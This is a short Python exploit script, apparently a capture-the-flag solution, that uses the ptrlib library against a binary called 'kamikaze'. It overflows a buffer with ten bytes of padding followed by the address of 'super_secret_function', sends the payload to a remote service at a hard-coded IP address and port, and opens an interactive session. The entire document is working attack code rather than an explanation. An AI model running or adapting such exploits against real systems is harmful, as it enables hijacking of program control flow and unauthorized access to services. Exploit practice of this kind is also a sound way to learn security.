from ptrlib import *

elf = ELF("./kamikaze")
#sock = Process("./kamikaze")
sock = Socket("13.48.67.196", 50000)

payload = b'A' * 10
payload += p64(elf.symbol('super_secret_function'))
sock.sendlineafter("Vote: ", payload)

sock.interactive()
